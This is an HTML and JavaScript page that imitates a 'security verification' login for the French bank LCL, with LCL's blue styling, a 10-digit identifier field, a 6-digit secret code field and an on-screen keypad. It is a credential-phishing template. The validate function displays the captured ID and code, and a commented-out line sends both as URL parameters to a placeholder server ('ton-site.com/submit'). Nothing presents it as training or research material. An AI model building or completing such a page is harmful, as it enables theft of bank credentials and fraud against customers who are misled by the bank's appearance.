<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification Sécurité LCL</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: white;
            padding: 30px;
            width: 320px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            border-radius: 8px;
        }

        h2 {
            text-align: center;
            color: #0055a4; /* Bleu LCL */
            margin-bottom: 20px;
            font-size: 18px;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #555;
        }

        /* Zone de saisie invisible (pour capter le focus) */
        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }

        /* Affichage des points (style demandé) */
        .display-area {
            border: none;
            /* Fond blanc pur pour masquer la bordure, ou transparent si préférence */
            background: transparent; 
            font-size: 24px;
            text-align: center;
            letter-spacing: 3px;
            color: #333;
            width: 100%;
            padding: 10px 0;
            box-sizing: border-box;
            /* Pas de bordure classique */
            border-bottom: 1px dashed #ccc; /* Optionnel : une fine ligne pointillée très légère pour délimiter */
        }

        /* Clavier numérique */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 20px;
        }

        .key {
            background-color: #f0f0f0;
            border: none;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            font-size: 20px;
            font-weight: bold;
            color: #333;
            cursor: pointer;
            transition: background-color 0.2s;
            margin: 0 auto; /* Centrer les boutons */
        }

        .key:active {
            background-color: #ddd;
            transform: scale(0.95);
        }

        .key-clear {
            background-color: #ffcccb; /* Rouge pâle */
            color: #c00;
        }
        
        .key-back {
            background-color: #e0e0e0;
        }

        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: #0055a4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        
        .btn-submit:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

    </style>
</head>
<body>

<div class="container">
    <h2>Vérification de Sécurité</h2>
    <p style="text-align: center; font-size: 13px; color: #666; margin-bottom: 20px;">
        Veuillez entrer vos identifiants pour confirmer votre identité.
    </p>

    <!-- Champ Identifiant (10 chiffres) -->
    <div class="input-group">
        <label>Identifiant (10 chiffres)</label>
        <!-- Input caché qui capture la frappe -->
        <input type="tel" id="input-id" class="hidden-input" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
        <!-- Zone visuelle avec des points -->
        <div id="display-id" class="display-area"></div>
    </div>

    <!-- Champ Mot de passe (6 chiffres) -->
    <div class="input-group">
        <label>Code secret</label>
        <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
        <div id="display-pass" class="display-area"></div>
    </div>

    <!-- Clavier Numérique -->
    <div class="keypad">
        <button class="key" onclick="press('1')">1</button>
        <button class="key" onclick="press('2')">2</button>
        <button class="key" onclick="press('3')">3</button>
        <button class="key" onclick="press('4')">4</button>
        <button class="key" onclick="press('5')">5</button>
        <button class="key" onclick="press('6')">6</button>
        <button class="key" onclick="press('7')">7</button>
        <button class="key" onclick="press('8')">8</button>
        <button class="key" onclick="press('9')">9</button>
        <button class="key key-back" onclick="backspace()">⌫</button>
        <button class="key" onclick="press('0')">0</button>
        <button class="key key-clear" onclick="clearAll()">C</button>
    </div>

    <button class="btn-submit" id="btn-validate" disabled onclick="validate()">Valider</button>
</div>

<script>
    let activeField = 'id'; // 'id' ou 'pass'
    const inputId = document.getElementById('input-id');
    const inputPass = document.getElementById('input-pass');
    const displayId = document.getElementById('display-id');
    const displayPass = document.getElementById('display-pass');
    const btnValidate = document.getElementById('btn-validate');

    // Initialisation : focus sur l'ID
    inputId.focus();

    // Cliquer sur la zone de texte active l'input correspondant
    displayId.addEventListener('click', () => {
        activeField = 'id';
        inputId.focus();
        updateCursor('id');
    });

    displayPass.addEventListener('click', () => {
        activeField = 'pass';
        inputPass.focus();
        updateCursor('pass');
    });

    // Mettre à jour le curseur visuel (ligne sous les points)
    function updateCursor(field) {
        if(field === 'id') {
            displayId.style.borderBottom = "1px dashed #0055a4";
            displayPass.style.borderBottom = "1px dashed #ccc";
        } else {
            displayPass.style.borderBottom = "1px dashed #0055a4";
            displayId.style.borderBottom = "1px dashed #ccc";
        }
    }

    // Gestion des boutons du clavier
    function press(num) {
        if (activeField === 'id') {
            if (inputId.value.length < 10) {
                inputId.value += num;
                updateDisplay('id', inputId.value);
            }
        } else {
            if (inputPass.value.length < 6) {
                inputPass.value += num;
                updateDisplay('pass', inputPass.value);
            }
        }
        checkValidation();
    }

    function backspace() {
        if (activeField === 'id') {
            inputId.value = inputId.value.slice(0, -1);
            updateDisplay('id', inputId.value);
        } else {
            inputPass.value = inputPass.value.slice(0, -1);
            updateDisplay('pass', inputPass.value);
        }
        checkValidation();
    }

    function clearAll() {
        inputId.value = '';
        inputPass.value = '';
        updateDisplay('id', '');
        updateDisplay('pass', '');
        activeField = 'id';
        inputId.focus();
        updateCursor('id');
        checkValidation();
    }

    // Mise à jour visuelle des points
    function updateDisplay(type, value) {
        if (type === 'id') {
            // Affiche des points pour chaque chiffre
            displayId.textContent = '•'.repeat(value.length);
            // Si on veut voir le chiffre au dernier moment ou juste des points :
            // Ici on force des points pour plus de sécurité
        } else {
            displayPass.textContent = '•'.repeat(value.length);
        }
    }

    // Vérifier si on peut activer le bouton Valider
    function checkValidation() {
        if (inputId.value.length === 10 && inputPass.value.length === 6) {
            btnValidate.disabled = false;
        } else {
            btnValidate.disabled = true;
        }
    }

    // Simulation de validation
    function validate() {
        const id = inputId.value;
        const pass = inputPass.value;
        alert(`Données envoyées :\nID : ${id}\nCode : ${pass}`);
        // Ici, tu peux ajouter le code pour envoyer les données à ton serveur
        // window.location.href = "https://ton-site.com/submit?id=" + id + "&pass=" + pass;
    }

    // Support de la frappe clavier physique
    document.addEventListener('keydown', (e) => {
        if (e.key >= '0' && e.key <= '9') {
            press(e.key);
        } else if (e.key === 'Backspace') {
            backspace();
        } else if (e.key === 'Tab') {
            e.preventDefault();
            if(activeField === 'id') {
                activeField = 'pass';
                inputPass.focus();
                updateCursor('pass');
            } else {
                activeField = 'id';
                inputId.focus();
                updateCursor('id');
            }
        }
    });

    // Garder le focus sur le champ actif
    document.addEventListener('click', (e) => {
        if(activeField === 'id') inputId.focus();
        else inputPass.focus();
    });

</script>

</body>
</html>
